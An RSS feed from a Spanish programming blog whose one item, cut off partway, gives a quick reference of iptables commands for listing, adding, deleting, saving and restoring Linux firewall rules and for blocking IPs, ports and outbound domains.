<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
    <channel>
        <title>Seguridad on El Baúl del programador</title>
        <link>https://elbauldelprogramador.com/categories/seguridad/index.xml</link>
        <description>Recent content in Seguridad on El Baúl del programador</description>
        <generator>Hugo -- gohugo.io</generator>
        <language>es-ES</language>
        <image>
            <url>https://elbauldelprogramador.com/img/bio-photo-rss.png</url>
            <link>https://elbauldelprogramador.com/categories/seguridad/index.xml</link>
            <title>Seguridad on El Baúl del programador</title>
            <width>144</width>
            <height>144</height>
        </image>
        <atom:link href="https://elbauldelprogramador.com/categories/seguridad/index.xml" rel="self" type="application/rss+xml" />
        
        <item>
            <title>20 ejemplos de iptables para SysAdmins novatos</title>
            <link>https://elbauldelprogramador.com/20-ejemplos-de-iptables-para-sysadmins/</link>
            <pubDate>Fri, 01 Jan 2016 00:00:00 +0000</pubDate>
            
            <guid>https://elbauldelprogramador.com/20-ejemplos-de-iptables-para-sysadmins/</guid>
            <description>&lt;p&gt;Linux por defecto trae un cortafuegos llamado NetFilter. Según el sitio oficil de proyecto:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;netfiltes es un conjunto de hooks (Ganchos) dentro del kernel de linux que permiten a los módulos del kernel registrar funciones callbacks con la pila de red. Una función callback registrada se llama entonces para cada paquete que atraviesa el hook correspondiente dentro de la pila de red.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;Este firewall lo controla un programa llamado iptables que gestiona el filtrado para IPv4, y ip6tables para IPv6.&lt;/p&gt;

&lt;h1 id=&#34;ejemplos-de-reglas-iptables&#34;&gt;Ejemplos de reglas IPTABLES&lt;/h1&gt;

&lt;ul&gt;
&lt;li&gt;Muchas de las acciones que se listan abajo requieren ejecutarse como usuario root.&lt;/li&gt;
&lt;li&gt;Los siguientes comandos deberían funcionar en cualquier distro linux moderna.&lt;/li&gt;
&lt;li&gt;Esto NO es un tutorial de como configurar iptables. Puedes ver un tutorial &lt;a target=&#34;_blank&#34; href=&#34;http://www.cyberciti.biz/faq/rhel-fedorta-linux-iptables-firewall-configuration-tutorial/&#34;&gt;aquí&lt;/a&gt;. Es más bien una referencia rápida de los comandos más comunes de iptables.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;!--ad--&gt;&lt;/p&gt;

&lt;h1 id=&#34;1-mostrando-el-estado-de-nuestro-firewall&#34;&gt;#1: Mostrando el estado de nuestro firewall&lt;/h1&gt;

&lt;p&gt;Teclea el siguiente comando como root:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -L -n -v
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Ejemplos de salidas:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;Chain INPUT &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;policy ACCEPT &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; packets, &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 pkts bytes target     prot opt in     out     &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt;               destination
Chain FORWARD &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;policy ACCEPT &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; packets, &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 pkts bytes target     prot opt in     out     &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt;               destination
Chain OUTPUT &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;policy ACCEPT &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; packets, &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 pkts bytes target     prot opt in     out     &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt;               destination
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;El resultado de arriba indica que el firewall no está activo. La siguiente salida es la del firewall activado:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;Chain INPUT &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;policy DROP &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; packets, &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 pkts bytes target     prot opt in     out     &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt;               destination
    &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0           state INVALID
  &lt;span class=&#34;m&#34;&gt;394&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;43586&lt;/span&gt; ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0           state RELATED,ESTABLISHED
   &lt;span class=&#34;m&#34;&gt;93&lt;/span&gt; &lt;span class=&#34;m&#34;&gt;17292&lt;/span&gt; ACCEPT     all  --  br0    *       0.0.0.0/0            0.0.0.0/0
    &lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;   &lt;span class=&#34;m&#34;&gt;142&lt;/span&gt; ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0
Chain FORWARD &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;policy DROP &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; packets, &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 pkts bytes target     prot opt in     out     &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt;               destination
    &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; ACCEPT     all  --  br0    br0     0.0.0.0/0            0.0.0.0/0
    &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0           state INVALID
    &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; TCPMSS     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0           tcp flags:0x06/0x02 TCPMSS clamp to PMTU
    &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0           state RELATED,ESTABLISHED
    &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; wanin      all  --  vlan2  *       0.0.0.0/0            0.0.0.0/0
    &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; wanout     all  --  *      vlan2   0.0.0.0/0            0.0.0.0/0
    &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt;     &lt;span class=&#34;m&#34;&gt;0&lt;/span&gt; ACCEPT     all  --  br0    *       0.0.0.0/0            0.0.0.0/0
Chain OUTPUT &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;policy ACCEPT &lt;span class=&#34;m&#34;&gt;425&lt;/span&gt; packets, 113K bytes&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 pkts bytes target     prot opt in     out     &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt;               destination
Chain wanin &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; references&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 pkts bytes target     prot opt in     out     &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt;               destination
Chain wanout &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; references&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
 pkts bytes target     prot opt in     out     &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt;               destination
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Donde,&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-L&lt;/strong&gt; : Muestra las reglas.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-v&lt;/strong&gt; : Muestra información detallada.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-n&lt;/strong&gt; : Muestra la dirección ip y puerto en formato numérico. No usa DNS para resolver nombres. Esto acelera la lista.&lt;/li&gt;
&lt;/ul&gt;

&lt;h2 id=&#34;1-1-para-inspeccionar-el-firewall-con-número-de-lineas&#34;&gt;#1.1:Para Inspeccionar el firewall con número de lineas:&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -n -L -v --line-numbers
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Salida:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;Chain INPUT &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;policy DROP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
num  target     prot opt &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt;               destination
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;    DROP       all  --  0.0.0.0/0            0.0.0.0/0           state INVALID
&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0           state RELATED,ESTABLISHED
&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0
&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0
Chain FORWARD &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;policy DROP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
num  target     prot opt &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt;               destination
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0
&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;    DROP       all  --  0.0.0.0/0            0.0.0.0/0           state INVALID
&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;    TCPMSS     tcp  --  0.0.0.0/0            0.0.0.0/0           tcp flags:0x06/0x02 TCPMSS clamp to PMTU
&lt;span class=&#34;m&#34;&gt;4&lt;/span&gt;    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0           state RELATED,ESTABLISHED
&lt;span class=&#34;m&#34;&gt;5&lt;/span&gt;    wanin      all  --  0.0.0.0/0            0.0.0.0/0
&lt;span class=&#34;m&#34;&gt;6&lt;/span&gt;    wanout     all  --  0.0.0.0/0            0.0.0.0/0
&lt;span class=&#34;m&#34;&gt;7&lt;/span&gt;    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0
Chain OUTPUT &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;policy ACCEPT&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
num  target     prot opt &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt;               destination
Chain wanin &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; references&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
num  target     prot opt &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt;               destination
Chain wanout &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt; references&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
num  target     prot opt &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt;               destination
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Podemos usar los números de línea para borrar o añadir nuevas reglas al firewall.&lt;/p&gt;

&lt;h2 id=&#34;1-2-mostrar-las-reglas-de-cadena-de-entrada-y-salida&#34;&gt;#1.2: Mostrar las reglas de cadena de entrada y salida:&lt;/h2&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -L INPUT -n -v
iptables -L OUTPUT -n -v --line-numbers
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id=&#34;2-parar-iniciar-reiniciar-el-firewall&#34;&gt;#2: Parar / Iniciar / Reiniciar el firewall&lt;/h1&gt;

&lt;p&gt;Si usas CentOS / RHEL / Fedora linux:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;service iptables stop
service iptables start
service iptables restart
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;También se puede usar propio comando iptables para detenerlo y borrar todas las reglas.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -F
iptables -X
iptables -t nat -F
iptables -t nat -X
iptables -t mangle -F
iptables -t mangle -X
iptables -P INPUT ACCEPT
iptables -P OUTPUT ACCEPT
iptables -P FORWARD ACCEPT
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Donde:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-F&lt;/strong&gt; : Borra todas las reglas.&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-X&lt;/strong&gt; : Borra cadenas&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-t table_name&lt;/strong&gt; : Selecciona una tabla y elimina reglas&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;-P&lt;/strong&gt; : Establece la política por defecto (como DROP, REJECT o ACCEPT)&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&#34;3-borrar-reglas-del-firewall&#34;&gt;#3: Borrar reglas del firewall&lt;/h1&gt;

&lt;p&gt;Para mostrar los números de línea junto a otra información para reglas existentes:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -L INPUT -n --line-numbers
iptables -L OUTPUT -n --line-numbers
iptables -L OUTPUT -n --line-numbers &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; less
iptables -L OUTPUT -n --line-numbers &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep 202.54.1.1
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Obtendrendremos la lista de IPs. Miramos el número de la izquierda y lo usamos para borrarla. Por ejemplo para borrar la línea 4:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -D INPUT 4
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;O para encontrar una ip de origen y borrarla de la regla&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -D INPUT -s 202.54.1.1 -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Donde:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;-D&lt;/strong&gt; : Elimina una o más reglas de la cadena seleccionada.&lt;/li&gt;
&lt;/ul&gt;

&lt;h1 id=&#34;4-insertar-reglas&#34;&gt;#4: Insertar reglas:&lt;/h1&gt;

&lt;p&gt;Para insertar una o más reglas en la cadena seleccionada como el número de cadena dada usamos la siguiente sintaxis. Primero encontramos el número de línea:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -L INPUT -n --line-numbers
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Salida:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;Chain INPUT &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;policy DROP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
num  target     prot opt &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt;               destination
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;    DROP       all  --  202.54.1.1           0.0.0.0/0
&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0           state NEW,ESTABLISHED
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Para insertar una regla entre 1 y 2;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -I INPUT &lt;span class=&#34;m&#34;&gt;2&lt;/span&gt; -s 202.54.1.2 -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Para ver las reglas actualizadas&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -L INPUT -n --line-numbers
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Salida:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;Chain INPUT &lt;span class=&#34;o&#34;&gt;(&lt;/span&gt;policy DROP&lt;span class=&#34;o&#34;&gt;)&lt;/span&gt;
num  target     prot opt &lt;span class=&#34;nb&#34;&gt;source&lt;/span&gt;               destination
&lt;span class=&#34;m&#34;&gt;1&lt;/span&gt;    DROP       all  --  202.54.1.1           0.0.0.0/0
&lt;span class=&#34;m&#34;&gt;2&lt;/span&gt;    DROP       all  --  202.54.1.2           0.0.0.0/0
&lt;span class=&#34;m&#34;&gt;3&lt;/span&gt;    ACCEPT     all  --  0.0.0.0/0            0.0.0.0/0           state NEW,ESTABLISHED
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id=&#34;5-guardar-reglas&#34;&gt;#5: Guardar reglas&lt;/h1&gt;

&lt;p&gt;Para guardar reglas en CentOS / RHEL / Fedora Linux:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;service iptables save
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;En este ejemplo, eliminamos una ip y guardamos las reglas del firewall:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A INPUT -s 202.5.4.1 -j DROP
service iptables save
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Para todas las dem��s distros usamos:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables-save &amp;gt; /root/my.active.firewall.rules
cat /root/my.active.firewall.rules
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id=&#34;6-restaurar-reglas&#34;&gt;#6: Restaurar reglas&lt;/h1&gt;

&lt;p&gt;Para restaurar reglas desde un archivo llamado /root/my.active.firewall.rules:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables-restore &amp;lt; /root/my.active.firewall.rules
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Bajo CentOS / RHEL / Fedora Linux:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;service iptables restart
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id=&#34;7-estableces-políticas-de-firewall-por-defecto&#34;&gt;#7: Estableces políticas de firewall por defecto&lt;/h1&gt;

&lt;p&gt;Para borrar todo el tráfico:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -P INPUT DROP
iptables -P OUTPUT DROP
iptables -P FORWARD DROP
iptables -L -v -n
&lt;span class=&#34;c1&#34;&gt;## you will not able to connect anywhere as all traffic is dropped ###&lt;/span&gt;
ping cyberciti.biz
wget http://www.kernel.org/pub/linux/kernel/v3.0/testing/linux-3.2-rc5.tar.bz2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&#34;7-1-solo-tráfico-entrante-bloqueado&#34;&gt;#7.1: Solo tráfico entrante bloqueado&lt;/h2&gt;

&lt;p&gt;Para borrar todos los paquetes entrantes / enviados pero permitir el tráfico saliente:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -P INPUT DROP
iptables -P FORWARD DROP
iptables -P OUTPUT ACCEPT
iptables -A INPUT -m state --state NEW,ESTABLISHED -j ACCEPT
iptables -L -v -n
&lt;span class=&#34;c1&#34;&gt;# *** now ping and wget should work *** ###&lt;/span&gt;
ping cyberciti.biz
wget http://www.kernel.org/pub/linux/kernel/v3.0/testing/linux-3.2-rc5.tar.bz2
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id=&#34;8-borrar-direcciones-de-red-privadas-en-la-interfaz-pública&#34;&gt;#8: Borrar direcciones de red privadas en la interfaz pública&lt;/h1&gt;

&lt;p&gt;IP Spoofing es nada más que para detener los siguientes rangos de direcciones IPv4 para redes privadas en sus interfaces públicas. Los paquetes con direcciones de origen no enrutables deben rechazarse mediante la siguiente sintaxis:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A INPUT -i eth1 -s 192.168.0.0/24 -j DROP
iptables -A INPUT -i eth1 -s 10.0.0.0/8 -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id=&#34;9-bloqueando-una-direción-ip-block-ip&#34;&gt;#9: Bloqueando una direción IP (BLOCK IP)&lt;/h1&gt;

&lt;p&gt;PAra bloquear una ip atacante llamada 1.2.3.4:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A INPUT -s 1.2.3.4 -j DROP
iptables -A INPUT -s 192.168.0.0/24 -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id=&#34;10-bloquear-peticiones-entrantes-de-un-puerto-block-port&#34;&gt;#10: Bloquear peticiones entrantes de un puerto (BLOCK PORT)&lt;/h1&gt;

&lt;p&gt;Para bloquear todas las solicitudes de servicio en el puerto 80:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A INPUT -p tcp --dport &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; -j DROP
iptables -A INPUT -i eth1 -p tcp --dport &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Para bloquear el puerto 80 para una ip:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A INPUT -p tcp -s 1.2.3.4 --dport &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; -j DROP
iptables -A INPUT -i eth1 -p tcp -s 192.168.1.0/24 --dport &lt;span class=&#34;m&#34;&gt;80&lt;/span&gt; -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h1 id=&#34;11-bloquear-ips-de-salida&#34;&gt;#11: Bloquear ips de salida&lt;/h1&gt;

&lt;p&gt;Para bloquear el tráfico saliente a un host o dominio en concreto como por ejemplo cyberciti.biz:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;host -t a cyberciti.biz
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Salida:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;cyberciti.biz has address 75.126.153.206
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Una vez conocida la dirección ip, bloqueamos todo el tráfico saliente para dicha ip así:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A OUTPUT -d 75.126.153.206 -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Se puede usar una subred como la siguiente:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A OUTPUT -d 192.168.1.0/24 -j DROP
iptables -A OUTPUT -o eth1 -d 192.168.1.0/24 -j DROP
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;h2 id=&#34;11-1-ejemplo-bloquear-el-dominio-facebook-com&#34;&gt;#11.1: Ejemplo - Bloquear el dominio facebook.com&lt;/h2&gt;

&lt;p&gt;Primero, encontrar la dirección ip de facebook.com&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;host -t a www.facebook.com
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Salida:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;www.facebook.com has address 69.171.228.40
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Buscar el CIDR para 69.171.228.40:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;whois 69.171.228.40 &lt;span class=&#34;p&#34;&gt;|&lt;/span&gt; grep CIDR
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Salida:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;CIDR:           69.171.224.0/19
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;

&lt;p&gt;Para prevenir el acceso externo a facebook.com:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span&gt;&lt;/span&gt;iptables -A OUTPUT -p tcp -d 69.171.224.0/19 -j DROP
